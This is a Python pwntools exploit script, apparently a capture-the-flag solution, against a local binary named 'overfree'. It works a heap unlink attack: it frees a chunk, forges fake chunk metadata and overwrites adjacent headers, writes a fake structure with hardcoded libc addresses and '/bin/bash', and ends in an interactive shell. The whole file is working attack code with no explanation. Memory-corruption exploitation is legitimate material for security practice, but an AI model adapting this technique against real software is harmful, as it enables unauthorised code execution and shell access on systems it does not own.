from pwn import *
def add(idx,size,data,addition="add"):
	p.sendline(addition)
	p.recvuntil("ex: ")
	p.sendline("%d"%(idx))
	p.recvuntil("ze: ")
	p.sendline("%d"%(size))
	p.recvuntil("ta: ")
	p.sendline("%s"%(data))
	return ;
def remove(idx):
	p.sendline("remove")
	p.recvuntil("ex: ")
	p.sendline("%d"%(idx))

cmd=0x6010b0
p=process("./overfree")
add(0,128,"A"*100)
add(1,128,"B"*100)
remove(0)
p.sendline("add\0AAAA"+p64(0)+p64(cmd-0x18)+p64(cmd-0x10))
p.recvuntil("ex: ")
p.sendline("2")
p.recvuntil("ze: ")
p.sendline("128")
p.recvuntil("ta: ")
p.sendline("C"*128+p64(4384)+p64(0x90)+p64(0xdeadbeef))
remove(1)

p.sendline(p64(0)+p64(0x00007ffff7dd48e0)+p64(0)+p64(0x601060))
payload=p64(0x400896)+p64(0x00007ffff7aa2c70)+p64(0x00007ffff7a9e710)+p64(0)+p64(0)+p64(0)+p64(0x00007ffff7dd5620)+p64(0)+p64(0x00007ffff7dd48e0)+p64(0)+p64(0x602010)+p64(0)+"/bin/bash\0"
print len(payload)
p.sendline(payload)
sh=0x6010b0
p.sendline("add")
p.recvuntil("ex: ")
p.sendline("3")
p.recvuntil("ze: ")
if True:
	gdb.attach(p,'''
	''')
p.sendline("6295744")

p.interactive()



